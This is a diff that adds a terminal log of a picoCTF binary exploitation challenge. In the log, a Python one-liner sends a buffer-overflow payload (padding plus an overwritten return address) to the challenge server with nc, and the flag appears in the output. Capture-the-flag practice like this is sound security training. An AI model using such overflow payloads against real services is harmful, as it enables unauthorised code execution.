@@ -1,0 +1,10 @@
+
+┌──(santey22㉿santey22)-[~]
+└─$ python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q",0x401256))' | nc mysterious-sea.picoctf.net 50719
+Welcome to the secure echo service!
+Please enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV@
+Thank you for using our service.
+picoCTF{3ch0_s3rv1c3_br34k5_5f4859dd}
+┌──(santey22㉿santey22)-[~]
+└─$
+
